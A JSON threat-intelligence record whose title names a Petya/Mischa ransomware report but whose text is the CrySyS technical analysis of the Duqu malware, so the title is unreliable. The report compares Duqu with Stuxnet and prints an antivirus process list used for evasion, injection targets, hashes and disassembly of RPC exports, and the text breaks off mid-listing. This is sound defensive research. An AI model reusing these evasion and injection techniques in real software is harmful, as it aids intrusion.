{
    "id": "50b4096c-23d9-4121-b38f-939219df6ce0",
    "created_at": "2023-01-12T15:06:02.722854Z",
    "updated_at": "2025-03-27T02:09:29.371839Z",
    "deleted_at": null,
    "sha1_hash": "99192e06113c35ba0508d7606a11774440ef3fe9",
    "title": "2016-05-19 - Petya and Mischa – Ransomware Duet (Part 1)",
    "authors": "",
    "file_creation_date": "2011-10-20T15:18:46Z",
    "file_modification_date": "2011-10-20T15:18:46Z",
    "file_size": 1544935,
    "plain_text": "# Duqu: A Stuxnet-like malware found in the wild\n\n##### v0.93 (14/Oct/2011)\n\n## Technical Report\n\n by\n\n#### Laboratory of Cryptography and System Security (CrySyS)\n\n http://www.crysys.hu/\n\n Budapest University of Technology and Economics\n\n Department of Telecommunications\n\n http://www.bme.hu/\n\n##### Authors: Boldizsár Bencsáth, Gábor Pék, Levente Buttyán, Márk Félegyházi \n\n\n-----\n\n## Findings in brief\n\nOur main two finding can be summarized in the followings:\n\n  - Stuxnet code is massively re-used in targeted attacks\n\n  - A new digitally signed windows driver is used by attackers that was signed by another\nhardware manufacturer in Taiwan\n\nWe believe that our findings open up a brand new chapter in the story of the targeted\nattacks that has emerged in the recent years, and especially, these pieces of information will\nraise many new questions on the Stuxnet story as well.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 2\n\n\n-----\n\n## Table of contents\n\n1. Introduction........................................................................................................................5\n\n2. Main components ..............................................................................................................6\n\n2.1. Comparison of Stuxnet and Duqu at a glance............................................................ 8\n\n2.2. Comparison of Duqu’s two main group of objects ..................................................11\n\n2.3. PE file dates..............................................................................................................12\n\n2.4. Directory listing and hashes.....................................................................................13\n\n3. Injection mechanism........................................................................................................14\n\n4. Injection target.................................................................................................................14\n\n5. Exported functions...........................................................................................................16\n\n6. Import preparation by hashes/checksums ......................................................................22\n\n7. Hooks................................................................................................................................25\n\n8. Payload and configuration encryption.............................................................................28\n\n9. PNF config file encryption ................................................................................................35\n\n10. Comparison of cmi4432.sys and jminet7.sys...............................................................36\n\n11. Code signing and its consequence ...............................................................................38\n\n12. Initial delay, lifespan, behavior ...................................................................................43\n\n13. Other components .......................................................................................................44\n\n13.1. Keylogger..................................................................................................................44\n\n13.2. Communication module...........................................................................................50\n\n14. Relations to other papers.............................................................................................57\n\n15. Unanswered questions.................................................................................................58\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 3\n\n\n-----\n\n16. Conclusion....................................................................................................................59\n\n17. References....................................................................................................................59\n\n18. Contact Information.....................................................................................................60\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 4\n\n\n-----\n\n## 1. Introduction\n\nStuxnet is the most interesting piece of malware in the last few years, analyzed by hundreds\nof security experts and the story told by thousands of newspapers. The main reason behind\nthe significant visibility is the targeted attack against the high profile, real-life, industrial\ntarget, which was considered as a thought experiment before. Experts have hypothesized\nabout the possibility of such a sophisticated attack, but Stuxnet rang the bell for a wider\naudience about the impact of cyber attacks on critical infrastructures.\n\nSurprisingly, the technical novelty of the individual components of the Stuxnet worm is not\nastonishing. What is more interesting is the way how those different parts are combined\nwith each other to result in a powerful targeted threat against control systems used in\nnuclear facilities. In fact, Stuxnet is highly modular, and this feature allows sophisticated\nattackers to build a targeted attack from various pieces of code, similar to the way\ncarmakers build new cars from available parts. This modularity also means a new era for\nmalware developers, with a new business model pointing towards distributed labor where\nmalware developers can work simultaneously on different parts of the system, and modules\ncan be sold on underground markets.\n\nIn this document, we reveal the existence of and report about a malware found in the wild\nthat shows striking similarities to Stuxnet, including its modular structure, injection\nmechanisms, and a driver that has a fraudulent digital signature on it. We named the\nmalware “Duqu” as it’s key logger creates temporary files with names starting with “~DQ…”.\n\nAs researchers, we are generally concerned with understanding the impact of the malware\nand designing appropriate defense mechanisms. This report makes the first steps towards\nthis goal. We describe the results of our initial analysis of Duqu, pointing out many\nsimilarities to Stuxnet. We must note, however, that due to the limited available time for\npreparing this report, many questions and issues remain unanswered or unaddressed.\nNevertheless, we hope that our report will still be useful for other security experts who\ncontinue the analysis of Duqu. To help follow-up activities, we discuss open questions at the\nend of this document.\n\nAs a more general impact, we expect that this report will open a new chapter in the story of\nStuxnet. Duqu is not Stuxnet, but its structure and design philosophy are very similar to\nthose of Stuxnet. At this point in time, we do not know more about their relationship, but we\nbelieve that the creator of Duqu had access to the source code of Stuxnet.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 5\n\n\n-----\n\n## 2. Main components\n\nUpon discovering the suspicious software, we performed an initial analysis, and uncovered\nthree main groups of components in the software: A standalone keylogger tool, the\n“Jminet7” group of objects, and the “cmi4432” group of objects as shown in Figure 1.\n\n\n**cmi4432_**\n**203627 (exe?)**\n**(comm module)**\n\n\n**Keylogger**\n\n\n**jminet7.sys**\n**(loader)**\n\n\n**nep191_**\n**res302.dll**\n\n\n**Registry data**\n\n\n**netp192.pnf**\n**(config)**\n\n\n**cmi4464.pnf**\n**(config)**\n\n\n**internal DLL**\n\n**(keylogger)**\n\n\n**Figure 1 – Main components and their modules.**\n\n\n**Registry data**\n\n\n**netp191.zdata.**\n\n**mz**\n\n\n**cmi4432.pnf**\n**(payload)**\n\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 6\n\n\n**cmi4432.sys**\n**(loader)**\n\n\n-----\n\nThe keylogger is a standalone .exe file that was found on an infected computer. It contains\nan internal encrypted DLL, which delivers the keylogging functions, whereas the main\nkeylogger executable injects the DLL and controls the keylogging (screen logging, etc.)\nprocess.\n\nThe jminet7 group of objects is working as follows: In the registry, a service is defined that\nloads the **jminet7.sys driver during the Windows bootup process. This kernel driver then**\nloads configuration data from itself and from the registry, and injects the netp191.pnf DLL\n**payload into a system process. Finally, some configuration data is stored in the netp192.pnf**\n**encrypted configuration file.**\n\nThe cmi4432 group of objects exhibits the same behavior: In the registry, a service is defined\nthat loads the **cmi4432.sys driver during the Windows bootup process. This kernel driver**\nthen loads configuration data from itself and from the registry, and injects the cmi4432.pnf\n**DLL payload into a system process. Finally, some configuration data is stored in the**\n**cmi4464.pnf encrypted configuration file.**\n\nThe jminet7 and the cmi4432 groups are very similar; they only differ in their payload. The\ndifference is tens of kilobytes in size. Also, the cmi4432.sys driver is signed and therefore can\nbe used e.g. on Windows 7 computers. It is not yet fully known if the two groups are\ndesigned for different computer types or they can be used simultaneously. It is possible that\nthe rootkit (jminet7 or cmi4432) provides functionality to install and start the keylogger.\n\nThe similarities to the Stuxnet malware group start to show up first at this very abstract\nmodule level. In case of Stuxnet, a service is defined in the registry that loads the mrxcls.sys\ndriver during the Windows bootup process. This kernel driver then loads configuration data\nfrom itself (encrypted in the .sys file) and from the registry; and injects (among others) the\n**oem7a.pnf DLL payload into a system process. Finally, some configuration data is stored in**\nthe **mdmcpq3dd.pnf encrypted configuration file. This initial similarity motivated us to**\nperform a thorough analysis of the malware code. Our analysis uncovered similarities that\nshow a close relationship between the two malware groups.\n\nThere is one more thing: There were only two known cases so far in which a malware used a\nkernel driver with a valid digital signature: Stuxnet’s mrxcls.sys was signed by the key of\n**RealTek, and after the revocation of RealTek’s certificate, a new version contained the**\nsignature of JMicron. Now, this list has a new member: cmi4432.sys contains a valid digital\n**signature of the Taiwanese manufacturer C-Media.**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 7\n\n\n-----\n\n### 2.1. Comparison of Stuxnet and Duqu at a glance\n\n**Feature** **Stuxnet** **Duqu**\n\n� �\nModular malware\n\nKernel driver based rootkit � � very similar\nValid digital signature on driver Realtek, JMicron C-Media\nInjection based on A/V list � � seems based on Stux.\nImports based on checksum � � different alg.\n3 Config files, all encrypted, etc. � � almost the same\n�\nKeylogger module ?\n\nPLC functionality � � (different goal)\n�\nInfection through local shares No proof, but seems so\n�\nExploits ?\n�\n0-day exploits ?\n� �\nDLL injection to system processes\n\nDLL with modules as resources � (many) � (one)\n� �\nRPC communication\n\n�\nRPC control in LAN ?\n�\nRPC Based C&C ?\n�\nPort 80/443, TLS based C&C ?\n\nSpecial “magic” keys, e.g. 790522, AE � � lots of similar\n� �\nVirtual file based access to modules\n\nUsage of LZO lib ? � multiple\n� �\nVisual C++ payload\n\n� �\nUPX compressed payload,\n\n� �\nCareful error handling\n\n� �\nDeactivation timer\n\nInitial Delay ? Some � 15 mins\nConfigurable starting in safe mode/dbg � � (exactly same mech.)\n**Table 1 – Comparing Duqu and Stuxnet at the first glance**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 8\n\n|Feature|Stuxnet|Duqu|\n|---|---|---|\n|Modular malware|\u0001|\u0001|\n|Kernel driver based rootkit|\u0001|\u0001 very similar|\n|Valid digital signature on driver|Realtek, JMicron|C-Media|\n|Injection based on A/V list|\u0001|\u0001 seems based on Stux.|\n|Imports based on checksum|\u0001|\u0001 different alg.|\n|3 Config files, all encrypted, etc.|\u0001|\u0001 almost the same|\n|Keylogger module|?|\u0001|\n|PLC functionality|\u0001|\u0002 (different goal)|\n|Infection through local shares|\u0001|No proof, but seems so|\n|Exploits|\u0001|?|\n|0-day exploits|\u0001|?|\n|DLL injection to system processes|\u0001|\u0001|\n|DLL with modules as resources|\u0001 (many)|\u0001 (one)|\n|RPC communication|\u0001|\u0001|\n|RPC control in LAN|\u0001|?|\n|RPC Based C&C|\u0001|?|\n|Port 80/443, TLS based C&C|?|\u0001|\n|Special “magic” keys, e.g. 790522, AE|\u0001|\u0001 lots of similar|\n|Virtual file based access to modules|\u0001|\u0001|\n|Usage of LZO lib|?|\u0001 multiple|\n|Visual C++ payload|\u0001|\u0001|\n|UPX compressed payload,|\u0001|\u0001|\n|Careful error handling|\u0001|\u0001|\n|Deactivation timer|\u0001|\u0001|\n|Initial Delay|? Some|\u0001 15 mins|\n|Configurable starting in safe mode/dbg|\u0001|\u0001 (exactly same mech.)|\n\n\n-----\n\n|Feature|oam7a.pnf (Stuxnet)|netp191.pnf (Duqu)|Col4|\n|---|---|---|---|\n|Packer|UPX|UPX||\n|Size|1233920 bytes|384512 bytes||\n|Exported functions #|21|8||\n|ntdll.dll hooks|ZwMapViewOfSection ZwCreateSection ZwOpenFile ZwClose ZwQueryAttributesFile ZwQuerySection|ZwMapViewOfSection ZwCreateSection ZwOpenFile ZwClose ZwQueryAttributesFile ZwQuerySection||\n|Resources|13 (201, 202, 203,205, 208, 209, 210, 220, 221,222, 240,241,242, 250)|1 (302)||\n\n\n**Table 2 – Similarities and differences between the two main dlls**\n\nTable 1 and Table 2 compare the features of Stuxnet and Duqu. From the comparison, the\nstrong similarity between the threats becomes apparent. When we dive into the details of\nthe codes, we even see that both malwares hook the same ntddl.dll functions. Furthermore,\nthe sections of the two dlls are also very similar as Stuxnet contains only one extra section\ncalled .xdata (Figure 3), but its characteristics are the same as the .rdata section of Duqu\n(Figure 2).\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 9\n\n\n-----\n\n**Figure 2 – The sections of Duqu’s netp191 dll**\n\n**Figure 3 – The sections of Stuxnet’s oem7a dll**\n\nThere are also differences between the two codes. The main dll of Stuxnet (oam7a.pnf)\ncontains 21 exported functions (with dedicated roles), but netp191.pnf has only 8 exported\nfunctions. The smaller number of functions is justified by the fact that Duqu does not contain\nthe power plant specific functionalities that Stuxnet does. However, the rest of this report\ndemonstrates that Duqu uses the mechanisms of Stuxnet via these functions.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 10\n\n\n-----\n\n### 2.2. Comparison of Duqu’s two main group of objects\n\n**File** **Compiler/Packer** **Description**\n\nKernel driver, loader of other\njminet7.sys\ncomponents\n\nnep191.pnf UPX Injected DLL payload\n\nnep191_res302.dll\n\nMS VC++ Private Version 1\nInternal part, ???\n\n(offset 175192) [Overlay]\n\nCompressed file (dll) in ??? (likely res302+comm.\nnetp191.zdata.mz\nunknown format module)\n\nKernel driver, loader of other\ncmi4432.sys\ncomponents\n\nInjected DLL payload\ncmi4432.pnf UPX\n\nMost likely, loader for the\n\ncmi4432_res302.dll\n\nMS VC++ Private Version 1\n\ncomm. module\n\n(offset 203627) [Overlay]\n\ncmi4432_\nCommunication module\n203627.dll\n\n**Table 3 – Comparing the two main group of objects**\n\nTable 3 summarizes a few pieces of information about the two main groups of objects we\nidentified in Duqu. The Compiler and Packer versions are reported by PEiD as shown in\nFigure 4.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 11\n\n|File|Compiler/Packer|Description|\n|---|---|---|\n|jminet7.sys||Kernel driver, loader of other components|\n|nep191.pnf|UPX|Injected DLL payload|\n|nep191_res302.dll (offset 175192)|MS VC++ Private Version 1 [Overlay]|Internal part, ???|\n|netp191.zdata.mz|Compressed file (dll) in unknown format|??? (likely res302+comm. module)|\n|cmi4432.sys||Kernel driver, loader of other components|\n|cmi4432.pnf|UPX|Injected DLL payload|\n|cmi4432_res302.dll (offset 203627)|MS VC++ Private Version 1 [Overlay]|Most likely, loader for the comm. module|\n|cmi4432_ 203627.dll||Communication module|\n\n\n-----\n\n**Figure 4 – The sections of Duqu’s netp191 dll (nep191.pnf)**\n\n### 2.3. PE file dates\n\n**File** **Date**\n\nCMI4432.PNF 17/07/2011 06:12:41\n\ncmi4432_res302.dll 21/12/2010 08:41:03\n\ncmi4432_203627.dll 21/12/2010 08:41:29\n\nnetp191.PNF 04/11/2010 16:48:28\n\nnep191_res302.dll 21/12/2010 08:41:03\n\nKeylogger.exe 01/06/2011 02:25:18\n\nKeylogger internal DLL 01/06/2011 02:25:16\n\n**Table 4 – Comparing dates of Duqu’s PE files**\n\nTable 4 shows the dates of Duqu’s each PE file.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 12\n\n|2.3. PE file dates|Col2|\n|---|---|\n|File|Date|\n|CMI4432.PNF|17/07/2011 06:12:41|\n|cmi4432_res302.dll|21/12/2010 08:41:03|\n|cmi4432_203627.dll|21/12/2010 08:41:29|\n|netp191.PNF|04/11/2010 16:48:28|\n|nep191_res302.dll|21/12/2010 08:41:03|\n|Keylogger.exe|01/06/2011 02:25:18|\n|Keylogger internal DLL|01/06/2011 02:25:16|\n\n\n-----\n\n### 2.4. Directory listing and hashes\n\nThe size, date and SHA1 sum of Duqu’s PE files are shown below.\n```\n192512 Sep 9 14.48 cmi4432.PNF\n 29568 Sep 9 15.20 cmi4432.sys\n 6750 Sep 9 14.48 cmi4464.PNF\n 24960 2008 Apr 14 jminet7.sys\n 85504 Aug 23 06.44 keylogger.ex\n232448 2009 Feb 10 netp191.PNF\n 6750 2009 Feb 10 netp192.PNF\n\n```\n**Sample 1 – File size, date and name – Directory listing of samples**\n```\n192f3f7c40fa3aaa4978ebd312d96447e881a473 *cmi4432.PNF\n588476196941262b93257fd89dd650ae97736d4d *cmi4432.sys\nf8f116901ede1ef59c05517381a3e55496b66485 *cmi4464.PNF\nd17c6a9ed7299a8a55cd962bdb8a5a974d0cb660 *jminet7.sys\n723c71bd7a6c1a02fa6df337c926410d0219103a *keylogger.ex\n3ef572cd2b3886e92d1883e53d7c8f7c1c89a4b4 *netp191.PNF\nc4e51498693cebf6d0cf22105f30bc104370b583 *netp192.PNF\n\n```\n**Sample 2 – sha1sum results for the samples**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 13\n\n\n-----\n\n## 3. Injection mechanism\n\nThe registry information for Duqu’s jminet7.sys in unencrypted form is presented below:\n\n`0000000000: 00 00 00 00 01 00 00 00 │ 10 BB 00 00 01 00 03 00   ☺` - ☺ ♥\n```\n0000000010: 82 06 24 AE 1A 00 00 00 │ 73 00 65 00 72 00 76 00 '♠$R→  s e r v\n0000000020: 69 00 63 00 65 00 73 00 │ 2E 00 65 00 78 00 65 00 i c e s . e x e\n0000000030: 00 00 38 00 00 00 5C 00 │ 53 00 79 00 73 00 74 00  8  \\ S y s t\n0000000040: 65 00 6D 00 52 00 6F 00 │ 6F 00 74 00 5C 00 69 00 e m R o o t \\ i\n0000000050: 6E 00 66 00 5C 00 6E 00 │ 65 00 74 00 70 00 31 00 n f \\ n e t p 1\n0000000060: 39 00 31 00 2E 00 50 00 │ 4E 00 46 00 00 00 D2   9 1 . P N F  Ň\n\n```\n**Sample 3 – decrypted registry data for Duqu’s jminet7.sys**\n\nKnowing the operation of Stuxnet from previous analyses, visual inspection of the code hints\nto the injection of “inf/netp191.PNF” into “services.exe”. Later, we will show that it also\ncommands that the encryption key of “0xAE240682” (offset 0x10) is used. The byte\nsequence “1A 00 00 00” that follows the encryption key can also be found in the Stuxnet\nregistry. The only difference is that in Stuxnet the export that should be called is between\nthe key and the “1A 00 00 00” string, here it is before “01 00 03 00”. So after injection,\nExport 1 should be called by the driver. The case of cmi4432.sys is the same, it is injected\ninto “services.exe” and then Export 1 is called.\n\n## 4. Injection target\n\nDuqu injection target selection is very similar to the mechanism of Stuxnet. For trusted\nprocesses both look up a list of known antivirus products. In Duqu, this list is stored in 0xb3\n0x1f XOR encrypted 0-terminated strings. In the Resource 302 part of the cmi4432 payload\nDLL the list is the following:\n```\n%A\\Kaspersky Lab\\AVP%v\\Bases\\*.*c\nMcshield.exe\nSOFTWARE\\KasperskyLab\\protected\\AVP80\\environment\nSOFTWARE\\KasperskyLab\\protected\\AVP11\\environment\nSOFTWARE\\KasperskyLab\\protected\\AVP10\\environment\nSOFTWARE\\KasperskyLab\\protected\\AVP9\\environment\nSOFTWARE\\KasperskyLab\\protected\\AVP8\\environment\nSOFTWARE\\KasperskyLab\\protected\\AVP7\\environment\nSOFTWARE\\kasperskylab\\avp7\\environment\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 14\n\n\n-----\n\n|SOFTWARE\\kasperskylab\\avp6\\environment ProductRoot avp.exe %C\\McAfee\\Engine\\*.dat SOFTWARE\\McAfee\\VSCore szInstallDir32 avguard.exe bdagent.exe UmxCfg.exe fsdfwd.exe %C\\Symantec Shared\\VirusDefs\\binhub\\*.dat rtvscan.exe ccSvcHst.exe ekrn.exe %A\\ESET\\ESET Smart Security\\Updfiles\\*.nup SOFTWARE\\TrendMicro\\NSC\\TmProxy InstallPath tmproxy.exe SOFTWARE\\Rising\\RIS SOFTWARE\\Rising\\RAV RavMonD.exe|Col2|\n|---|---|\n\n\n**Sample 4 – Duqu’s antivirus list (trusted processes) from cmi4432 res302 DLL**\n\nBasically, the list above is almost identical to the one in Stuxnet (even uses the same\nordering), the only difference is the addition of the Chinese Rising Antivirus.\n\nThe outer part, cmi4432.dll contains some addition this list:\n```\n%A\\Kaspersky Lab\\AVP%v\\Bases\\*.*c\nMcshield.exe\nSOFTWARE\\KasperskyLab\\protected\\AVP80\\environment\nSOFTWARE\\KasperskyLab\\protected\\AVP11\\environment\nSOFTWARE\\KasperskyLab\\protected\\AVP10\\environment\nSOFTWARE\\KasperskyLab\\protected\\AVP9\\environment\nSOFTWARE\\KasperskyLab\\protected\\AVP8\\environment\nSOFTWARE\\KasperskyLab\\protected\\AVP7\\environment\nSOFTWARE\\kasperskylab\\avp7\\environment\nSOFTWARE\\kasperskylab\\avp6\\environment\nProductRoot\navp.exe\n%C\\McAfee\\Engine\\*.dat\nSOFTWARE\\McAfee\\VSCore\nszInstallDir32\navguard.exe\nbdagent.exe\nUmxCfg.exe\nfsdfwd.exe\n%C\\Symantec Shared\\VirusDefs\\binhub\\*.dat\nrtvscan.exe\nccSvcHst.exe\nekrn.exe\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 15\n\n\n-----\n\n|%A\\ESET\\ESET Smart Security\\Updfiles\\*.nup SOFTWARE\\TrendMicro\\NSC\\TmProxy InstallPath tmproxy.exe SOFTWARE\\Rising\\RIS SOFTWARE\\Rising\\RAV RavMonD.exe 360rp.exe 360sd.exe|Col2|\n|---|---|\n\n\n**Sample 5 – possible targets - in our case lsass.exe was used.**\n\n360rp.exe and 360sd.exe is added.\n\nFor netp191.PNF (DLL), both the external and the internal DLL contains only the first list of\nantivirus products without 360rp.exe and 360sd.exe. The keylogger also contains the same\nlist including 360rp.exe and 360sd.exe.\n```\n%SystemRoot%\\system32\\lsass.exe\n%SystemRoot%\\system32\\winlogon.exe\n%SystemRoot%\\system32\\svchost.exe\n\n```\n**Sample 6 – possible targets - in our case lsass.exe was used.**\n\nThe evolution of the list items corresponds to the file dates in the MZ headers. All the\nexectuables whose header the year 2011 contain 360rp.exe and 360sd.exe (the earliest\nexample is the keylogger.exe with date 01/06/2011 02:25:18), while earlier components do\nnot contain 360rp.exe and 360sd.exe.\n\n## 5. Exported functions\n\nFigure 5 and Figure 6 show the exported functions of netp191.pnf and cmi4432.pnf,\nrespectively. While netp191.pnf contains 8 exports, cmi4432 lacks export number _3 and _7.\nEach export has a specific role with similarities to the exports of Stuxnet’s main dll.\n\nWe could not yet identify the function of each export, except exports 1, 7, and 8, which are\nresponsible for RPC functions. Below, we describe our findings related to RPC.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 16\n\n\n-----\n\nFirst, exports _1 and _8 of netp191.pnf are essentially the same as the first (_1) and the last\n(_32) exports of Stuxnet’s oam7a.pnf. In case of Stuxnet, these exports served to infect\nremovable devices and started an RPC server to communicate with other instances of the\nmalware. The only difference was that _1 started the RPC server with wait, while _32 did not\nsleep before the start of the RPC server. In case of netp191.pnf, export _1 and export_8 are\nalso related to RPC communication and differ only in a few bits.\n\n**Figure 5 – The exports of netp191.pnf**\n\n**Figure 6 – The exports of cmi4432.pnf**\n\nExport _7 of netp191.pnf is almost the same as the RPC server export _27 in Stuxnet. Thus,\nwe can assert that Duqu might have the same functionality to update itself from another\nDuqu instance or from the C&C server. The main similarities between the two RPC server\ninitializations are highlighted in Sample 7 (Duqu) and Sample 8 (Stuxnet) . Note that there is\na slight mutation between the two samples, but despite of this, the implemented\nfunctionalities are the same.\n```\n.text:100011A3         public RPC_Server_7\n\n```\n.text:100011A3 RPC_Server_7  proc near        ; DATA XREF: .rdata:off_1001C308 o �\n```\n.text:100011A3         mov   eax, offset sub_1001B756\n.text:100011A8         call  Nothing_sub_10018C14\n.text:100011AD         sub   esp, 10h\n.text:100011B0         push  ebx\n.text:100011B1         push  esi\n.text:100011B2         push  edi\n.text:100011B3         mov   [ebp-10h], esp\n.text:100011B6         and   dword ptr [ebp-4], 0\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 17\n\n\n-----\n\n|.text:100011BA lea esi, [ebp-18h]|Col2|\n|---|---|\n|.text:100011BD call sub_10008CBD .text:100011C2 xor ebx, ebx .text:100011C4 inc ebx .text:100011C5 mov [ebp-4], bl .text:100011C8 call sub_10008D9B .text:100011CD call sub_1000778F .text:100011D2 test al, al .text:100011D4 jnz short loc_100011F2 .text:100011D6 mov [ebp-4], al .text:100011D9 mov eax, esi .text:100011DB push eax .text:100011DC call each_export_calls_sub_10008CCD .text:100011E1 .text:100011E1 loc_100011E1: ; DATA XREF: sub_1000122C+4 ٴo .text:100011E1 xor eax, eax .text:100011E3 mov ecx, [ebp-0Ch] .text:100011E6 mov large fs:0, ecx .text:100011ED pop edi .text:100011EE pop esi .text:100011EF pop ebx .text:100011F0 leave .text:100011F1 retn .text:100011F2 ; --------------------------------------------------------------------------- .text:100011F2 .text:100011F2 loc_100011F2: ; CODE XREF: RPC_Server_7+31 ٳj .text:100011F2 call sub_10006C53 .text:100011F7 lea eax, [ebp-11h] .text:100011FA push eax .text:100011FB call sub_10001318 .text:10001200 mov eax, dword_1002A134 .text:10001205 cmp dword ptr [eax], 0 .text:10001208 jnz short loc_1000121B .text:1000120A mov [ebp-1Ch], ebx .text:1000120D push offset unk_1001FC18 .text:10001212 lea eax, [ebp-1Ch] .text:10001215 push eax .text:10001216 call Exception_Handler_sub_10013880 .text:1000121B .text:1000121B loc_1000121B: ; CODE XREF: RPC_Server_7+65 ٳj .text:1000121B mov eax, [eax] .text:1000121D mov edx, [eax] .text:1000121F mov ecx, eax .text:10001221 call dword ptr [edx+8] .text:10001224 push ebx ; dwExitCode .text:10001225 push eax ; hLibModule .text:10001226 call ds:FreeLibraryAndExitThread .text:10001226 RPC_Server_7 endp||\n\n\n**Sample 7 – Export function _7 in netp191.pnf**\n```\n.text:10001CA2         public _27_RPCServer\n.text:10001CA2 _27_RPCServer  proc near        ; DATA XREF: .rdata:off_10055518 o �\n.text:10001CA2         mov   eax, offset loc_10052604\n.text:10001CA7         call  Nothing_sub_1004AB94\n.text:10001CAC         sub   esp, 0Ch\n.text:10001CAF         push  ebx\n.text:10001CB0         push  esi\n.text:10001CB1         push  edi\n.text:10001CB2         mov   [ebp-10h], esp\n.text:10001CB5         and   dword ptr [ebp-4], 0\n.text:10001CB9         lea   esi, [ebp-18h]\n.text:10001CBC         call  sub_1002214A\n.text:10001CC1         mov   byte ptr [ebp-4], 1\n.text:10001CC5         call  sub_10022228\n.text:10001CCA         push  2\n.text:10001CCC         push  offset dword_1005CCF0\n.text:10001CD1         call  sub_100226BB\n.text:10001CD6         pop   ecx\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 18\n\n\n-----\n\n|.text:10001CD7 pop ecx|Col2|\n|---|---|\n|.text:10001CD8 call sub_100319D2 .text:10001CDD test al, al .text:10001CDF jnz short loc_10001CFD .text:10001CE1 mov [ebp-4], al .text:10001CE4 mov eax, esi .text:10001CE6 push eax .text:10001CE7 call each_export_calls_1002215A .text:10001CEC .text:10001CEC loc_10001CEC: ; DATA XREF: sub_10001D1E+12 ٴo .text:10001CEC xor eax, eax .text:10001CEE mov ecx, [ebp-0Ch] .text:10001CF1 mov large fs:0, ecx .text:10001CF8 pop edi .text:10001CF9 pop esi .text:10001CFA pop ebx .text:10001CFB leave .text:10001CFC retn .text:10001CFD ; --------------------------------------------------------------------------- .text:10001CFD .text:10001CFD loc_10001CFD: ; CODE XREF: _27_RPCServer+3D ٳj .text:10001CFD call sub_100193EA .text:10001D02 lea eax, [ebp-11h] .text:10001D05 push eax .text:10001D06 call sub_10001E2D .text:10001D0B push 1 ; dwExitCode .text:10001D0D mov eax, dword_1006A840 .text:10001D12 call sub_10022379 .text:10001D17 push eax ; hLibModule .text:10001D18 call ds:FreeLibraryAndExitThread .text:10001D18 _27_RPCServer endp||\n\n\n**Sample 8 – Export function _27 in oam7a.pnf (Stuxnet)**\n\n**Figure 7 – Cross references to library function RPCServerUnregisterIf in oam7a.pnf**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 19\n\n\n-----\n\n**Figure 8 – Cross references to library function RPCServerUnregisterIf in netp191.pnf**\n\nFigure 7 and Figure 8 show the cross-reference graph to the library function\nRpcServerUnregisterIf. An obvious similarity between the two control flows is that in both\ncases RpcServerUnregisterIf has two ingress edges, RPCStopServerListening_... and\nCallRPCUnregisterIF_…. Furthermore, the number of function calls from the RPC server\nexport functions to the examined library function is three via CallRPCUnregisterIF_…\nFurthermore, we identified that Duqu uses the same type of bindings as Stuxnet (see Sample\n9 and Sample 10 for details).\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 20\n\n\n-----\n\n|.text:10006FB8 push ebp|Col2|\n|---|---|\n|.text:10006FB9 mov ebp, esp .text:10006FBB and esp, 0FFFFFFF8h .text:10006FBE push offset aRpcss ; \"rpcss\" .text:10006FC3 call sub_10006FE0 .text:10006FC8 push offset aNetsvcs ; \"netsvcs\" .text:10006FCD call sub_10006FE0 .text:10006FD2 push offset aBrowser ; \"browser\" .text:10006FD7 call sub_10006FE0 .text:10006FDC mov esp, ebp .text:10006FDE pop ebp .text:10006FDF retn||\n\n\n**Sample 9 – Duqu calls the RPC functions via three bindings, similarly to Stuxnet**\n```\n.text:100197F1         push  ebp\n.text:100197F2         mov   ebp, esp\n.text:100197F4         and   esp, 0FFFFFFF8h\n.text:100197F7         push  offset aRpcss  ; \"rpcss\"\n.text:100197FC         call  sub_10019819\n.text:10019801         push  offset aNetsvcs ; \"netsvcs\"\n.text:10019806         call  sub_10019819\n.text:1001980B         push  offset aBrowser ; \"browser\"\n.text:10019810         call  sub_10019819\n.text:10019815         mov   esp, ebp\n.text:10019817         pop   ebp\n.text:10019818         retn\n\n```\n**Sample 10 – Stuxnet calls the RPC functions via three bindings**\n\nWe also found many other correlations (e.g., the impersonation of anonymous tokens)\nbetween the two RPC mechanisms. As a consequence, we conclude that Duqu uses the same\n(or very similar) RPC logic as Stuxnet to update itself.\n\nUnfortunately, we still could not dissect the exact mechanism of the remaining exports of\nDuqu, but we suspect that they implement the same functionalities as the corresponding\nexports of Stuxnet.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 21\n\n\n-----\n\n## 6. Import preparation by hashes/checksums\n\nBoth Stuxnet and Duqu uses the trick that some exports are prepared by looking up\nchecksums/hashes in particular DLL-s and comparing the results instead of directly naming\nthe specific function (more info in case of Stuxnet driver is available in [ThabetMrxCls]\nChapter 3-4.)\n```\ntext:10001C41         push  edi\n.text:10001C42         push  790E4013h    ; GetKernelObjectSecurity\n.text:10001C47         mov   [ebp+var_24], eax\n.text:10001C4A         mov   [ebp+var_34], eax\n.text:10001C4D         call  